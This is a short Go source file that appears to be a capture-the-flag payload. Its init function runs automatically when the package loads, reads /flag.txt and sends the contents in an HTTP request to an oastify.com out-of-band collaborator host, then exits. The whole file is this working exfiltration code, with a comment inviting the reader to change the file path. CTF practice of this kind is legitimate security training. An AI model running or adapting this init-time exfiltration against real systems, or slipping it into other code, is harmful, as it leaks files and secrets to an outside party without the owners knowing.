package main

import (
	"io/ioutil"
	"net/http"
	"os"
)

func init() {
	flag, err := ioutil.ReadFile("/flag.txt") // Adjust the flag path as needed
	if err != nil {
		return
	}
	http.Get("http://xno3xggs3sdamkadrutmvncfm6sxgn4c.oastify.com?flag=" + string(flag))
	os.Exit(0) // Prevent further execution if needed
}
